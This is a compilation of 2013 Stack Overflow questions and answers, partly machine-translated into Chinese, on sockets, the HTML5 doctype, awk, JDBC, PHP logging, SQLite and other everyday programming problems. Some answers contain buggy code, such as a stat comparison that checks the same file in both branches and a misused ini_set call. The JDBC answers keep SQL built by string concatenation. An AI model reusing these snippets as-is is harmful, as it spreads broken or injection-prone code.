*   [wxPython 和 ARCGIS](https://stackoverflow.com/questions/9628257/wxpython-and-arcgis)

听起来您必须将 wxPython 添加为加载项。

# sockets - Why socket does not set to non blocking mode?

> ID：16184830
> 
> 赞同：2
> 
> 时间：2013-04-24T06:26:43.023
> 
> 标签：sockets, winapi, common-lisp, wininet

I try to set my socket to non-blocking mode using `ioctlsocket`, but it returns `-1` and `WSAGetLastError` returns `10045` - Operation not supported. Why could that happen?

The code I write is rather specific, because it's not C++, but Lisp with Foreign Language Interface (it allows calling C and C++ functions from dll's), but really it doesn't matter, because everything else does work.

Here is the code:

```
(defconstant FIONBIO #x5421)
(setf socket-descriptor (socket AF_INET SOCK_STREAM IPPROTO_TCP))
...
(fli:with-dynamic-foreign-objects ((no-block (:unsigned :long) :initial-element 1))
  (ioctlsocket socket-descriptor FIONBIO no-block))
... 
```

`socket-descriptor` - is just a socket descriptor, created with standard function `socket`

`FIONBIO` - a constant, I've found it's value just by googling it

`no-block` - a pointer to `u_long`, value of th u_long is `1`.

`ioctlsocket` returns -1 and `WSAGetLastError` returns 10045.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:37:00.067

如果它有帮助，你得到的错误 10045`WSAGetLastError`描述如下：

![在此处输入图像描述](https://i.stack.imgur.com/rjwku.png)

**编辑**
在我的 Windows 系统上，我在调试器中检查了 的值`FIONBIO`，它应该是`0x8004667E`.

它在 Windows 8 SDK`winsock.h`和`winsock2.h`Windows 8 SDK 中都是这样定义的：

```
#define _IOW(x,y,t)  (IOC_IN|(((long)sizeof(t)&IOCPARM_MASK)<<16)|((x)<<8)|(y))
#define FIONBIO      _IOW('f', 126, u_long) /* set/clear non-blocking i/o */ 
```

如果你设置一个`unsigned int`等于`FIONBIO`，那么`0x8004667E`就是你得到的。

# html - HTML5 is not based on SGML, and therefore does not require a reference to a DTD

> ID：16184832
> 
> 赞同：5
> 
> 时间：2013-04-24T06:26:45.240
> 
> 标签：html, dtd

From: [http://www.w3schools.com/tags/tag_doctype.asp](http://www.w3schools.com/tags/tag_doctype.asp)

> The < !DOCTYPE > declaration is not an HTML tag; it is an instruction to the web browser about what version of HTML the page is written in.
> 
> In HTML 4.01, the < !DOCTYPE > declaration refers to a DTD, because HTML 4.01 was based on SGML. The DTD specifies the rules for the markup language, so that the browsers render the content correctly.
> 
> ***HTML5 is not based on SGML, and therefore does not require a reference to a DTD.***
> 
> *Tip: Always add the < !DOCTYPE > declaration to your HTML documents, so that the browser knows what type of document to expect.*

Does the bold statement mean that when we are using HTML 5 we don't need to specify **< !DOCTYPE html >**?
What does that statement exactly mean?

I am currently using **< !DOCTYPE html >** in my html file with the browser Firefox 4\. I removed that declaration but did not see any difference in the rendered output. ***Does it mean that the problem may occur in old browsers and not in new ones?***

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T06:43:11.397

The terminology is confusing, but a [DTD (document type **definition**)](http://en.wikipedia.org/wiki/Document_Type_Definition) is only one part of a [document type **declaration**](http://en.wikipedia.org/wiki/Document_Type_Declaration) (usually shortened to "doctype"). You should always include a doctype **declaration** (`<!DOCTYPE html>` if you use HTML5), but a document type **definition** identifier is no longer necessary.

To provide a concrete example, this is what a HTML4.01 document type **declaration** ("doctype") might have looked like:

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> 
```

The document type **definition** ("DTD") identifier in the above declaration is this part:

```
"-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd" 
```

That's the part you can leave off for HTML5\. "PUBLIC" specifies the DTD's availability, so that should also not be included if there is no DTD.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-24T06:30:12.883

> 粗体声明是否意味着当我们使用 HTML 5 时我们不需要指定 ?

这意味着您*无法*指定。

HTML 5 Doctype 中没有公共或系统标识符。

> 我目前`<!DOCTYPE html>`在我的 html 文件中使用

这是必需的。继续这样做。

> 使用浏览器 Firefox 4。

Firefox 的当前稳定版本是 20 版。您可能应该升级。

> 我删除了该声明，但在呈现的输出中没有看到任何差异。这是否意味着问题可能出现在旧浏览器中而不是新浏览器中？

不，这只是意味着您没有任何代码受到处于[Quirks 模式](http://en.wikipedia.org/wiki/Quirks_mode)的影响（或者您有但没有发现更改）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T06:38:51.330

让我们看看 W3C HTML5 定义，他们有一个关于 HTML5 带来的差异的方便页面：http: [//www.w3.org/TR/html5-diff/#doctype](http://www.w3.org/TR/html5-diff/#doctype)

> 2.2 文档类型
> 
> HTML5 的 HTML 语法要求指定 doctype 以确保浏览器以标准模式呈现页面。文档类型没有其他用途。[文档类型]
> 
> HTML 语法的 doctype 声明不区分大小写。来自早期 HTML 版本的文档类型更长，因为 HTML 语言是基于 SGML 的，因此需要对 DTD 的引用。**在 HTML5 中，情况不再如此**，只需要 doctype 来为使用 HTML 语法编写的文档启用标准模式。浏览器已经为 .
> 
> 为了支持不能生成首选短文档类型的遗留标记生成器，HTML 语法中允许使用该文档类型。
> 
> HTML 4.0、HTML 4.01、XHTML 1.0 和 XHTML 1.1 的严格文档类型在 HTML 语法中也是允许的（但不鼓励）。
> 
> 在**XML 语法**中，可以使用任何 doctype 声明，也**可以完全省略**它。具有 XML 媒体类型**的文档始终以标准模式处理**。

在该页面上，第 1 章（简介）详细介绍了 HTML 与 XML 语法：

> HTML5 草案 (..) 定义了一种称为 HTML 的单一语言，它可以用**HTML**语法和**XML**语法编写。

因此，如果您的 HTML5 是严格的 XML 语法，我可以从最后一段中得出结论，是的，在这种情况下，您不应该在 doctype 行前面加上前缀。

语法上的区别参见第 2 章：

HTML5 **HTML**语法：

```
<!doctype html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Example document</title>
  </head>
  <body>
    <p>Example paragraph</p>
  </body>
</html> 
```

HTML5 **XML**语法：

```
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <title>Example document</title>
  </head>
  <body>
    <p>Example paragraph</p>
  </body>
</html> 
```

语法上有一些细微的差别。

# php - Modifying Wordpress plugin - Paid Memberships Pro

> ID：16184834
> 
> 赞同：0
> 
> 时间：2013-04-24T06:26:50.210
> 
> 标签：php, wordpress

I need to modify the way a Wordpress plugin (Paid Memberships Pro) displays an excerpt, which has actually become a 2 part question.

The first part: Can someone point me in the direction of info on properly modifying a plugin? Is there something similar to hooks/filters like you can use on core?

The fun part:

I want to modify this bit of code to make sure that only 1 paragraph is displayed, regardless of its length. If the paragraph is shorter than 55 characters, display the whole thing and nothing more. If more than 55 characters, display those 55 characters and nothing more.

Here's the code from the plugin:

```
//if show excerpts is set, return just the excerpt
    if(pmpro_getOption("showexcerpts"))
    {           
        //show excerpt
        global $post;
        if($post->post_excerpt)
        {                               
            //defined exerpt
            $content = wpautop($post->post_excerpt);
        }
        elseif(strpos($content, "<span id=\"more-" . $post->ID . "\"></span>") !== false)
        {               
            //more tag
            $pos = strpos($content, "<span id=\"more-" . $post->ID . "\"></span>");
            $content = wpautop(substr($content, 0, $pos));
        }
        elseif(strpos($content, 'class="more-link">') !== false)
        {
            //more link
            $content = preg_replace("/\<a.*class\=\"more\-link\".*\>.*\<\/a\>/", "", $content);
        }
        else
        {
            //auto generated excerpt. pulled from wp_trim_excerpt
            $content = strip_shortcodes( $content );
            $content = str_replace(']]>', ']]&gt;', $content);
            $content = strip_tags($content);
            $excerpt_length = apply_filters('excerpt_length', 55);
            $words = preg_split("/[\n\r\t ]+/", $content, $excerpt_length + 1, PREG_SPLIT_NO_EMPTY);
            if ( count($words) > $excerpt_length ) {
                array_pop($words);
                $content = implode(' ', $words);
                $content = $content . "... ";
            } else {
                $content = implode(' ', $words) . "... ";
            }

            $content = wpautop($content);
        }
    } 
```

Thanks!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:38:26.667

好吧，修改别人的插件通常是个坏主意，因为如果他们更新它，您可能会丢失您的更改或者您将无法更新（尽管发生意外）。

除了修改之外的另一个选项可能是设置跨度或 div 的最大高度或宽度。或者在页面加载时使用 JavaScript/jquery 来抓取该内容并缩短它。或者使用 wordpress 过滤器在加载后但显示之前过滤帖子内容。

我个人会在它周围找到 div 并设置最大尺寸。它简单、快速且可配置。

如果您绝对必须修改插件。我建议复制它，重命名它，然后在那里进行更改。然后，当有更新时，您可以更新、再次复制并手动添加您的更改。或者类似的东西。

您还可以查看插件使用的任何过滤器。钩子不仅仅用于核心。所有插件都应该使用它们（通常我不会使用任何没有使用的插件），并且任何使用的插件都可以使用钩子轻松修改。这就是他们的目的。这太棒了，因为这意味着 wordpress 中的任何内容都可以更改。

# awk - 在 awk 中设置默认数字格式

> ID：16184840
> 
> 赞同：0
> 
> 时间：2013-04-24T06:27:07.797
> 
> 标签：awk, formatting

我想对两个带有 id 和一些相应数值的文件进行简单的解析。我不想让 awk 以科学计数法打印数字。

文件如下所示：

```
someid-1 860025 50.0401 4.00022
someid-2 384319 22.3614 1.78758
someid-3 52096 3.03118 0.242314
someid-4 43770 2.54674 0.203587
someid-5 33747 1.96355 0.156967
someid-6 20281 1.18004 0.0943328
someid-7 12231 0.711655 0.0568899
someid-8 10936 0.636306 0.0508665
someid-9 10224.8 0.594925 0.0475585
someid-10 10188.8 0.59283 0.047391 
```

当使用 print 而不是 printf 时：

```
awk 'BEGIN{FS=OFS="\t"} NR==FNR{x[$1]=$0;next} ($1 in x){split(x[$1],k,FS); print $1,k[2],k[3],k[4],$2,$3,$4}' OSCAo.txt dme_miRNA_PIWI_OSC.txt | sort -n -r -k 7 | head 
```

我得到这个结果：

```
dme-miR-iab-4-5p      0.333333    0.000016    0.000001  0.25    0.000605606 9.36543e-07
dme-miR-9c-5p   10987.300000      0.525413    0.048798  160.2   0.388072    0.000600137
dme-miR-9c-3p   731.986000    0.035003    0.003251  2.10714 0.00510439  7.89372e-06
dme-miR-9b-5p   30322.500000      1.450020    0.134670  595.067 1.4415  0.00222922
dme-miR-9b-3p   2628.280000   0.125684    0.011673  48  0.116276    0.000179816
dme-miR-9a-3p    10.365000    0.000496    0.000046  0.25    0.000605606 9.36543e-07
dme-miR-999-5p  103.433000    0.004946    0.000459  0.0769231   0.00018634  2.88167e-07
dme-miR-999-3p  1513.790000   0.072389    0.006723  28  0.0678278   0.000104893
dme-miR-998-5p  514.000000    0.024579    0.002283  73  0.176837    0.000273471
dme-miR-998-3p  3529.000000   0.168756    0.015673  42  0.101742    0.000157339 
```

*注意最后一栏的科学记数法*

我知道带有适当格式修饰符的 printf 可以完成这项工作，但代码变得非常冗长。我必须写这样的东西：

```
awk 'BEGIN{FS=OFS="\t"} NR==FNR{x[$1]=$0;next} ($1 in x){split(x[$1],k,FS); printf "%s\t%3.6f\t%3.6f\t%3.6f\t%3.6f\t%3.6f\t%3.6f\n", $1,k[2],k[3],k[4],$2,$3,$4}' file1.txt file2.txt > fileout.txt 
```

当我必须`fileout`使用另一个类似结构的文件进行解析时，这变得很笨拙。

有没有办法指定默认的**数字**输出，这样任何字符串都将像字符串一样打印，但所有数字都遵循特定的格式。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T08:04:52.077

我认为你误解了`%3.6f`. 小数点前的第一个数字是字段宽度，而不是“小数点前的位数”。（见[打印（3）](http://linux.die.net/man/3/printf)）

所以你应该`%10.6f`改用。它可以很容易地在`bash`

```
$ printf "%3.6f\n%3.6f\n%3.6f" 123.456 12.345 1.234
123.456000
12.345000
1.234000
$ printf "%10.6f\n%10.6f\n%10.6f" 123.456 12.345 1.234
123.456000
 12.345000
  1.234000 
```

您可以看到后者正确对齐小数点。

如前所述`sidharth c nadhan`，您可以使用`OFMT` `awk`内部变量（似乎[awk(1)](http://www.manpagez.com/man/1/awk/)）。一个例子：

```
$ awk 'BEGIN{print 123.456; print 12.345; print 1.234}'
123.456
12.345
1.234
$ awk -vOFMT=%10.6f 'BEGIN{print 123.456; print 12.345; print 1.234}'
123.456000
 12.345000
  1.234000 
```

正如我在您的示例中看到的，最大位数的数字可以是 123456.1234567，因此格式`%15.7f`涵盖所有内容并显示漂亮的表格。

但不幸的是，如果数字中没有小数点，或者即使有，它也不会起作用，但它以 . 结尾`.0`。

```
$ awk -vOFMT=%15.7f 'BEGIN{print 123.456;print 123;print 123.0;print 0.0+123.0}'
    123.4560000
123
123
123 
```

我什至尝试过`gawk`'s`strtonum()`函数，但整数被视为非 OFMT 字符串。看

```
awk -vOFMT=%15.7f -vCONVFMT=%15.7f 'BEGIN{print 123.456; print strtonum(123); print strtonum(123.0)}' 
```

它具有与以前相同的输出。

所以我认为，`printf`无论如何你都必须使用。该脚本可以更短一些并且更易于配置：

```
awk -vf='\t'%15.7f 'NR==FNR{x[$1]=sprintf("%s"f f f,$1,$2,$3,$4);next}$1 in x{printf("%s"f f f"\n",x[$1],$2,$3,$4)}' file1.txt file2.txt 
```

如果第一个文件中有重复的 ID，该脚本将无法正常工作。如果没有发生，则可以更改这两个条件，并且`;next`可以将其保留。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:55:11.393

```
awk 'NR==FNR{x[$1]=$0;next} ($1 in x){split(x[$1],k,FS); printf "%s\t%9s\t%9s\t%9s\t%9s\t%9s\t%9s\n", $1,k[2],k[3],k[4],$2,$3,$4}' file1.txt file2.txt > fileout.txt 
```

# html - Phonegap 未检测到准确位置

> ID：16184842
> 
> 赞同：-1
> 
> 时间：2013-04-24T06:27:12.417
> 
> 标签：html, cordova, geolocation

我在 phonegap 中使用 HTML5 Geolocation API 来精确检测我的位置。我在印度工作，理想情况下，我应该能够看到我的位置，即印度浦那，但事实并非如此。

它检测到“美国加利福尼亚州旧金山”作为我的位置。可能是什么问题？

谢谢你们。高度赞赏帮助。

让我分享代码:)

```
document.addEventListener("deviceready", onDeviceReady, false);

// Cordova is loaded and it is now safe to make calls Cordova methods
//
function onDeviceReady() {
    // onSuccess Callback
    //   This method accepts a `Position` object, which contains
    //   the current GPS coordinates
    //

    var onSuccess = function(position) {
        var lattitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        //Ajax Call
        $.ajax({
               url: 'http://maps.googleapis.com/maps/api/geocode/json?latlng='+lattitude+','+longitude+'&sensor=true',
               success: function(data){
                alert(data.results[0].formatted_address);
               //alert(data.results[1].formatted_address);
               },
               error: function(data){
               alert('error');
               }
               });//Ajax call ends
    };

    function onError(error) {
        alert('code: '+ error.code + '\n' + 'message: ' + error.message + '\n');
    }

    navigator.geolocation.getCurrentPosition(onSuccess, onError);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:48:45.450

如果您使用的是 iOS 模拟器，您将始终将 SF 作为位置，因为它具有静态位置设置。但是，您可以使用这个漂亮的工具在浏览器中进行模拟，它会让您弄乱位置设置等等。

[http://emulate.phonegap.com/](http://emulate.phonegap.com/)

# java - java.sql.SQLException: ORA-00928: missing SELECT keyword

> ID：16184853
> 
> 赞同：2
> 
> 时间：2013-04-24T06:27:45.463
> 
> 标签：java, jdbc

I am getting the above mentioned exception while executing the SQL query in Java.

```
statement2.executeUpdate("INSERT INTO visit_header" 
    + "VALUES('"+visitnumber+"','"+date+"','"+cookie+"','"+ip+"')"); 
```

I want to know where it is going wrong.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T06:30:18.520

您忘记在 visit_header 和值之间放置空格：

```
statement2.executeUpdate("INSERT INTO visit_header" + " VALUES ('"+visitnumber+"','"+date+"','"+cookie+"','"+ip+"')"); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-24T06:30:51.300

根据最初的外观，您的 sql 查询有问题：

```
statement2.executeUpdate("INSERT INTO visit_header" + "VALUES 
```

应该

```
statement2.executeUpdate("INSERT INTO visit_header " + "VALUES  //Note space after header 
```

visit_header 和 VALUES 之间没有空格，所以您的查询是这样的：

```
INSERT INTO visit_headerVALUES 
```

这是错误的。

# php - 哪个数据库适合以 PHP 作为前端的 1400 万条记录

> ID：16184858
> 
> 赞同：0
> 
> 时间：2013-04-24T06:28:02.600
> 
> 标签：php, mysql, mongodb, database, nosql

我必须在业务搜索门户上工作，我认为要输入和搜索的建议记录约为 1400 万。

我打算使用 PHP 作为前端，使用 Mysql 作为后端。但我认为这会降低网站的整体性能。所以请建议使用哪个后端？

此致

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T08:11:17.217

让我印象深刻的一件事是这个词：“搜索”。它被列为您需要的核心功能之一。

SQL 和 NoSQL 数据库的问题在于，老实说，它们仍然不擅长搜索。

MongoDB 有一个非常 alpha 的 FTS 功能，但是，正如我刚刚提到的，它是非常 alpha 并且目前没有真正的客户端驱动程序挂钩。不仅如此，它还可能会在当前状态下更改其 API。

考虑到您希望网站的核心目的之一是搜索，我建议您要么拥有专门的 FTS 技术，要么拥有 SQL/NoSQL 数据库和 FTS 技术。

我个人更喜欢 Sphinx 搜索，但是，我使用 Solr 取得了相当大的成功。

当然，还有其他 FTS 技术，例如 Lucene、Elastic Search 等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:30:28.457

这取决于您的 DBSchema 和您使用数据的方式。Mysql 和 fork MariaDB 非常适合这项工作:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:40:30.820

PostgreSQL：终极选择。轻量级和优化。仍然，@KLK1 建议。这取决于您的 DBSchema 和您使用数据的方式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T06:40:43.730

数据库的性能更多地取决于您组织数据的方式（这意味着您的数据库模式），然后取决于数据库本身。你可以拥有最快的数据库，如果你有一个糟糕的数据库模式，性能可能会比在普通数据库上设计良好的数据库模式差得多。正如评论中所说，1400 万条记录根本不算多，MySQL 可以应付，MongoDB 也可以。

# shell - 比较shell中两个文件的日期

> ID：16184859
> 
> 赞同：2
> 
> 时间：2013-04-24T06:28:14.467
> 
> 标签：shell

我有两个在不同时间创建的文件。

在我的 shell 脚本程序中，我想用之前创建的文件的日期初始化一个变量。

例如。如果 file1 是在 4 月 22 日创建的，而 file2 是在 4 月 19 日创建的。我的变量应该初始化为 4 月 19 日。

如何在 bash shell 中执行此操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T07:40:05.620

假设存在 GNU `stat`（GNU coreutils 的一部分）：

```
if [[ $(stat -c%W <file1>) -lt $(stat -c%W <file2>) ]]
then
    EARLIER="$(stat -c%w <file1>)"
else
    EARLIER="$(stat -c%w <file1>)"
fi 
```

请注意`%W`（整数）与`%w`（人类可读）的情况很重要。

`%W`/`%w`是出生时间，因为您要求“创建时间”。通常`%Y`/ `%y`（最后修改）或`%Z`/ `%z`（最后更改）更有意义。

如果您的日期需要不同的格式，您可以将`stat`输出提供给`date`，例如：

```
date -d "$(stat -c%w <earlier_file>)" +"%Y-%m-%d") 
```

**PS：**当您涉及时间戳时，请考虑[RFC 3339](https://www.ietf.org/rfc/rfc3339)的格式，即 YYYY-MM-DD HH:MM:DD-TZ，它是明确的、可移植的和可排序的。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-24T06:55:06.487

`/bin/date`可以[转换为 timestamps](http://netbsd.gw.com/cgi-bin/man-cgi?date++NetBSD-current)，使用`%s`格式，之后日期比较是一个直接的数字比较，所以解决你的问题，模语法错误，是：

```
DATE1=`date -j '22 April' +"%d %B"`
DATE2=`date -j '19 April' +"%d %B"`
if [[ $DATE2 < $DATE1 ]]; then
    export VAR=`date -j $DATE1 +"%s"`
else
    export VAR=`date -j $DATE2 +"%s"`
fi 
```

# iphone - 如何从 iPhone 应用程序导航到 iTunes 中的更新部分

> ID：16184866
> 
> 赞同：0
> 
> 时间：2013-04-24T06:28:40.017
> 
> 标签：iphone, ios, app-store, itunes

在我的 iphone 应用程序中，我只想导航到 iTunes 的更新部分，以便用户可以看到我的应用程序的更新版本。我正在尝试使用以下行来做到这一点

```
NSString* link = @"itms-apps://itunes.apple.com/WebObjects/MZStore.woa/wa/viewSoftwareUpdate?id=My_App_Id&mt=8";  
[[UIApplication sharedApplication] openURL: [NSURL URLWithString:link]]; 
```

它把我带到了 iTunes，但加载了一段时间后，它会显示一条警报，即“无法连接到 iTunes Store”。

那么我怎样才能导航到 iTunes 更新部分？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-01T04:37:50.553

将用户直接发送到您在商店中的应用。“FREE”或“$”按钮将反映“UPDATE”。

# ios - 如何从 iOS 中的 Sqlite 将 NSdata 检索到 NSdictionary

> ID：16184867
> 
> 赞同：0
> 
> 时间：2013-04-24T06:28:42.043
> 
> 标签：ios, sqlite, nsdictionary, nsdata

我正在创建`iOS`使用 Sqlite DB 的应用程序。我创建了`Table`：

```
const char *sql_stmt = "CREATE TABLE IF NOT EXISTS ORDERTABLE (ID INTEGER PRIMARY KEY AUTOINCREMENT, ITEMDESC TEXT)"; 
```

然后我必须将 self.selectedItemsDictnory 字典插入到 ItemDESC 我插入为：

```
NSData *data = [NSJSONSerialization dataWithJSONObject:self.selectedItemsDictnory options:NSJSONWritingPrettyPrinted error:nil];
        NSString *insertSQL = [NSString stringWithFormat: @"INSERT INTO ORDERTABLE(ITEMDESC)VALUES( \"%@\");",data]; 
```

至此，成功完成。

现在我必须以相同的格式检索这本字典

我正在做的是：

```
if (sqlite3_open(dbpath, &orderDB) == SQLITE_OK)
    {            
        const char* sqlStatement = [[NSString stringWithFormat:@"SELECT * FROM ORDERTABLE WHERE (ID = '%d')",self.orderSelected]cStringUsingEncoding:NSUTF8StringEncoding];
        sqlite3_stmt* statement;

            if (sqlite3_prepare_v2(orderDB, sqlStatement, -1, &statement, NULL) == SQLITE_OK) {

                if( sqlite3_step(statement) == SQLITE_ROW )
                {

               NSData *retData = (__bridge NSData*) sqlite3_column_value(statement, 1);
               NSDictionary *jsonObject=[NSJSONSerialization
                                              JSONObjectWithData:retData
                                              options:NSJSONReadingMutableLeaves
                                              error:nil];
                    NSLog(@"jsonObject is %@",jsonObject);
                    NSDictionary *dic = [NSDictionary dictionaryWithContentsOfData:retData];
                    NSLog(@"dic is %@",dic);

                }
            }

            sqlite3_finalize(statement);
            sqlite3_close(orderDB);
        } 
```

* * *

但我得到了严重的额外异常。请帮助我检索数据

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:45:23.373

如果您可以在此处粘贴 JSON，是否可以。返回类型`NSJSONSerialization`可以是字典或数组，它取决于根 json 对象。

代替

```
NSDictionary *jsonObject=[NSJSONSerialization
                                          JSONObjectWithData:retData
                                          options:NSJSONReadingMutableLeaves
                                          error:nil]; 
```

尝试

```
NSArray *jsonObject=[NSJSONSerialization
                                          JSONObjectWithData:retData
                                          options:NSJSONReadingMutableLeaves
                                          error:nil]; 
```

还有一个好习惯是使用错误参数来注册任何异常，这样你就可以使用

```
NSError *logError = nil;
NSArray *jsonObject=[NSJSONSerialization
                                          JSONObjectWithData:retData
                                          options:NSJSONReadingMutableLeaves
                                          error:&error]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T07:03:14.547

尝试以下代码从 sqlite 获取数据

```
if (sqlite3_prepare_v2(_database, [query UTF8String], -1, &statement, nil) == SQLITE_OK)
 {
    while (sqlite3_step(statement) == SQLITE_ROW) {
        int uniqueId = sqlite3_column_int(statement, 0);
        char * temp = (char *) sqlite3_column_text(statement, 1);  
        NSString *item_desc = [[NSString alloc] initWithUTF8String:temp];                                  
    }
    sqlite3_finalize(statement);
} 
```

# ms-access - Textbox calculation appears only after navigating through other records in access

> ID：16184870
> 
> 赞同：1
> 
> 时间：2013-04-24T06:28:55.240
> 
> 标签：ms-access, ms-access-2007, ms-access-2010

I have a form that is linked to a table in Access. I have an additional field which displays the sum of a few fields in the table. This field on the form is not connected to the table. I have the sum displayed on the form but what I noticed is that the sum does not appear until I move away and navigate to another record and come back to the original record. I don't see the addition as soon as I enter values in the respective fields.

Can someone help with this issue?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:33:08.030

听起来您需要为`After Update`总和中使用的字段的控件事件添加一些代码。该代码可以调用`.Refresh`执行计算和更新总数的控件方法。

## 编辑

*另一种可能性是，如果控制*值和*字段*值具有相同的名称，则它们之间可能存在歧义。在报表的设计视图中，如果您将字段从“字段列表”拖放到报表中，则 Access 会创建一个与该字段同名的报表控件。这可能会在以后混淆问题，因为如果有任何表达式引用，`=[SomeColumn]`则不清楚它是指字段还是控件。`txtSomeColumn`如果报告行为异常，通常简单地将控件重命名为类似的名称会有所帮助。

# c++ - 删除循环链表中的节点

> ID：16184876
> 
> 赞同：1
> 
> 时间：2013-04-24T06:29:08.933
> 
> 标签：c++, linked-list, circular-list

我有一个基本的链表问题，我试图在下面解决。对于我的方法、算法的正确性（甚至编码风格），我将不胜感激。该问题需要一个函数来删除循环链接列表中所有出现的 int 并返回列表中的任何节点或 NULL（当列表为空时）。

这是我到目前为止的一些 C++ 代码：

```
struct Node{
    Node* next;
    int data;
};

Node* deleteNode(Node* &node, int num){

    if(!node){
        return NULL;
    }

    Node* given = node;
    Node* del;

    while(node->next != given){
        if(node->next->data == num){
            del = node->next;
            node->next = node->next->next;
            delete del;
        }
        node = node->next;
    }

    //Check if the first node needs to be deleted, with variable node pointing to last element
    if(given->data == num){
        node->next = given->next;
        delete given;
    }

    return node;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:45:05.080

`delete node;`应该`delete del;`是。

此外，`Node* node`用作参数，而不是`Node* &node`它会阻止非左值传入。

ps 在结构定义后忘记分号？:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T08:34:27.077

如果不遵循您的所有逻辑，我一眼就能看出该代码无法正常工作。

您正在检查输入列表是否为空，这是您的代码返回的唯一情况`NULL`。但是，如果传递给您一个必须删除所有元素的列表，会发生什么？

这个问题也有微妙之处。要检查您是否完成了循环列表，您需要与第一个地址进行比较，以查看您是否链接回起点。但是，如果此元素已被删除，那么根据 C++ 标准，您**甚至不允许在比较中使用其地址**。

为了避免两次遍历要删除的元素，一种可能的技巧是在开始迭代时“打破循环”，以便您可以检查`NULL`而不是检查起始节点的地址。

# null - 使用 ID 更新 Bulk Null

> ID：16184877
> 
> 赞同：0
> 
> 时间：2013-04-24T06:29:16.490
> 
> 标签：null

我有 20000 条记录，将它们导入表后，我有很多为空的列。我只想在这些列中添加随机数。我想使用 Job_ID 编号（自动递增编号）一次选择大约 1000 列，并将同一表中的另一列设为数字 1 或随机文本位像“固定”

我该怎么做呢？我是个大菜鸟，所以放轻松..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T07:23:02.330

您可能有这样的 SQL 查询：

```
SELECT 
  row1,
  row2, 
  row3
FROM table1 
```

并且一些 row*s 是 NULL 并且你想用一些默认值替换它，你可以这样做：

```
SELECT 
  COALESCE(row1, 'row1default') as row1, 
  COALESCE(row2, 'row2default') as row2, 
  COALESCE(row3, 'row3default') as row3 
FROM table1 
```

# mobile - 无法从诺基亚 S40 系列手机正确发送和接收印地语数据

> ID：16184878
> 
> 赞同：4
> 
> 时间：2013-04-24T06:29:20.730
> 
> 标签：mobile, java-me, nokia, nokia-s40, hindi

我正在尝试使用我的诺基亚 S40 系列手机的 JAXRPC 网络服务以 HINDI 语言发送数据，主要问题是在网络服务器上收到的数据格式不正确。我在网络服务器上得到的只是“？？？？？？” （问号）。我哪里错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T14:47:56.360

在发送到 Web 服务之前，您应该在设备上将您的字符串编码为 UTF-8。确保在 web 服务中接收时从 UTF-8 解码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T17:23:13.377

如果您使用的是输入流，那么像下面的代码一样获取它

```
 HttpConnection conn = (HttpConnection) Connector.open(Feed);
    InputStream rssStream = conn.openInputStream();
    InputStreamReader isr = new InputStreamReader(rssStream, "utf8"); 
```

# php - 记录php错误但不在浏览器中显示

> ID：16184881
> 
> 赞同：4
> 
> 时间：2013-04-24T06:29:32.830
> 
> 标签：php, error-handling

我想创建错误日志，但不想在浏览器中显示它。

目前，当发生错误或警告/通知时，会创建日志并向浏览器显示错误，但我想强制系统不在浏览器中向站点访问者显示错误消息，而是为我创建日志。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T06:34:29.340

确保你的 php.ini 中有这样的内容：

```
display_errors = Off
error_log = /var/log/php/error.log # Assuming you have /var/log/php directory and it's writable by httpd
error_reporting = E_ALL & ~E_DEPRECATED 
```

或者将它们设置为运行时选项`ini_set()`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T06:36:11.070

将此添加到脚本的顶部：

```
//don't display errors
ini_set('display_errors', 0);
//write errors to log
ini_set('log_errors', 1);
//error log file name
ini_set('log_errors', '/var/log/php/error.log');

error_reporting(E_ALL); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:37:11.583

如果要记录自定义错误：

```
try {
    // your code here
} catch (Exception $e){
    error_log($e->getMessage(), $e->getCode(), $e->getFile().' Line '.$e->getLine());
} 
```

否则使用[user4035 方式](https://stackoverflow.com/a/16184920/1559720)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T06:31:32.553

可以试试

```
error_reporting(E_ERROR | E_PARSE); 
```

# asp.net-mvc-4 - 如何在 Razor 视图中实现这种类型的动态 UI？

> ID：16184882
> 
> 赞同：0
> 
> 时间：2013-04-24T06:29:33.430
> 
> 标签：asp.net-mvc-4, razor-2

![在此处输入图像描述](https://i.stack.imgur.com/H7I24.png)

我首先要说我是 Web 开发和 MVC 的绝对新手。

